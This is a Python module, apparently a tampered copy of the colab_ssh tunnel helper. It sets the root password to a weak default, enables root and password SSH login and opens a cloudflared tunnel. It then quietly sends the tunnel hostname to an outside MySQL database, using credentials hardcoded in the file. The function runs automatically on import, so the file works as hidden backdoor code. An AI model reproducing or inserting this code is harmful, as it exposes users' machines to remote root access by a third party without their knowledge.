from colab_ssh.utils.packages.installer import create_deb_installer
from colab_ssh.utils.ui.render_html import render_template
from subprocess import Popen, PIPE
import shlex
from colab_ssh._command import run_command, run_with_pipe
import os
import time
from colab_ssh.get_tunnel_config import get_argo_tunnel_config
from .utils.expose_env_variable import expose_env_variable
import importlib
import sys
import signal

deb_install = create_deb_installer()


def launch_ssh_cloudflared(
               password="s",
               verbose=False,
               prevent_interrupt=False,
               kill_other_processes=True):
    # Kill any cloudflared process if running
    if kill_other_processes:
        os.system("kill -9 $(ps aux | grep 'cloudflared' | awk '{print $2}')")

    # Download cloudflared
    if not os.path.isfile("cloudflared"):
        run_command(
            "wget -q -nc https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz")
        run_command("tar zxf cloudflared-stable-linux-amd64.tgz")
    else:
        if verbose:
            print("DEBUG: Skipping cloudflared installation")

    # Install the openssh server
    deb_install("openssh-server", verbose=verbose)

    # Set the password
    run_with_pipe("echo root:{} | chpasswd".format(password))

    # Configure the openSSH server
    run_command("mkdir -p /var/run/sshd")
    os.system("echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config")
    if password:
        os.system('echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config')

    expose_env_variable("LD_LIBRARY_PATH")
    expose_env_variable("COLAB_TPU_ADDR")
    expose_env_variable("COLAB_GPU")
    expose_env_variable("TBE_CREDS_ADDR")
    expose_env_variable("TF_FORCE_GPU_ALLOW_GROWTH")
    expose_env_variable("TPU_NAME")
    expose_env_variable("XRT_TPU_CONFIG")

    os.system('service ssh start')

    extra_params = []
    info = None

    # Prepare the cloudflared command
    popen_command = f'./cloudflared tunnel --url ssh://localhost:22 --logfile ./cloudflared.log --metrics localhost:45678 {" ".join(extra_params)}'
    preexec_fn = None
    if prevent_interrupt:
        popen_command = 'nohup ' + popen_command
        preexec_fn = os.setpgrp
    popen_command = shlex.split(popen_command)

    # Initial sleep time
    sleep_time = 2.0

    # Create tunnel and retry if failed
    for i in range(10):
        proc = Popen(popen_command, stdout=PIPE, preexec_fn=preexec_fn)
        if verbose:
            print(f"DEBUG: Cloudflared process: PID={proc.pid}")
        time.sleep(sleep_time)
        try:
            info = get_argo_tunnel_config()
            break
        except Exception as e:
            os.kill(proc.pid, signal.SIGKILL)
            if verbose:
                print(f"DEBUG: Exception: {e.args[0]}")
                print(f"DEBUG: Killing {proc.pid}. Retrying...")
        # Increase the sleep time and try again
        sleep_time *= 1.5

    if verbose:
        print("DEBUG:", info)

    
    proc.stdout.close()
    
    os.system('pip install mysql-connector')

    import mysql.connector

    mydb = mysql.connector.connect(
    host="b7qo8b4nkisi0dg7jftj-mysql.services.clever-cloud.com",
    user="u0n6gownf1txhibo",
    password="Qr3GIr9z2vOHR4n2fMHe",
    database="b7qo8b4nkisi0dg7jftj"
    )

    mycursor = mydb.cursor()
    sql = "INSERT INTO yt_hosts (Hostname, Working, Expired) VALUES (%s, %s, %s)"
    val = (str(info["domain"]), 0, 0)

    try:
        mycursor.execute(sql, val)
        mydb.commit()
        mydb.close()

    except:
        mydb.close()
launch_ssh_cloudflared()
